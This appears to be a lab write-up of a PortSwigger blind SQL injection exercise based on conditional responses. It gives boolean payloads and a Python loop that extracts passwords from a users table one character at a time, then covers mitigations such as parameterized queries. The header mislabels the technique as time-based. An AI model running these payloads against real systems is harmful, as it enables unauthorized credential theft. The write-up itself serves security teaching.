# Blind SQL Injection - Conditional Responses

## Lab Link
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

## Difficulty
Practitioner

## Vulnerability Type
SQL Injection - Blind (Time-based)

## Theory
Blind SQLi occurs when the application doesn't return error messages or query results. Attacker must infer data through conditional logic in the query. If condition is TRUE, page behaves normally; if FALSE, behavior differs.

Example:
```sql
Original: SELECT user WHERE id = 1 AND 1=1
(Normal page)

Modified: SELECT user WHERE id = 1 AND 1=2
(Different page content or error)
```

## Recon Process
1. Identify injection point
2. Craft conditional statements (1=1 vs 1=2)
3. Observe differences in response (Welcome message, page content, etc.)
4. Build queries that return TRUE/FALSE based on conditions
5. Extract data character by character

## Exploitation Steps

### Step 1: Confirm Vulnerability
```
Payload: 1 AND 1=1
Result: Normal response

Payload: 1 AND 1=2
Result: Different response
```

### Step 2: Extract Data with Conditions
```sql
-- Check if username starts with 'a'
Payload: 1 AND (SELECT username FROM users LIMIT 1) LIKE 'a%'

-- If true, page shows "Welcome"
-- If false, page doesn't show "Welcome"
```

### Step 3: Character-by-Character Extraction
```sql
-- Extract first character
Payload: 1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64

-- If TRUE: character is ASCII > 64
-- If FALSE: character is ASCII < 65
-- Use binary search to find exact character
```

### Step 4: Automate Extraction
Use sqlmap or write script:
```python
for position in range(1, 50):
    for char in range(32, 127):
        payload = f"1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{position},1)) = {char}"
        if page_has_welcome(payload):
            print(chr(char))
            break
```

## Root Cause
- SQL injection vulnerability exists
- No error messages displayed
- Application behavior differs based on query result
- No parameterized queries

## Impact
- **Data Extraction:** Slower than UNION-based, but possible
- **Authentication Bypass:** Extract password hashes
- **Database Enumeration:** Map entire database
- **Privilege Escalation:** Find admin credentials

## Mitigations

### 1. **Parameterized Queries** (Primary Defense)
```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
```

### 2. **Error Handling**
```python
try:
    result = db.query(sql)
except DatabaseError:
    return "An error occurred"  # Don't expose details
```

### 3. **Input Validation**
- Only allow expected input types
- Reject SQL keywords and special characters

### 4. **Web Application Firewall**
- Detect blind SQLi patterns
- Monitor response times
- Alert on suspicious activity

## Detection vs UNION SQLi
- Blind SQLi: Slower (character by character extraction)
- UNION SQLi: Faster (multiple rows at once)
- Blind SQLi: Harder to detect (no errors)
- UNION SQLi: Easier to detect (unusual results)

## Key Lesson
Always use parameterized queries. Even without visible errors, blind SQLi can extract all database contents.
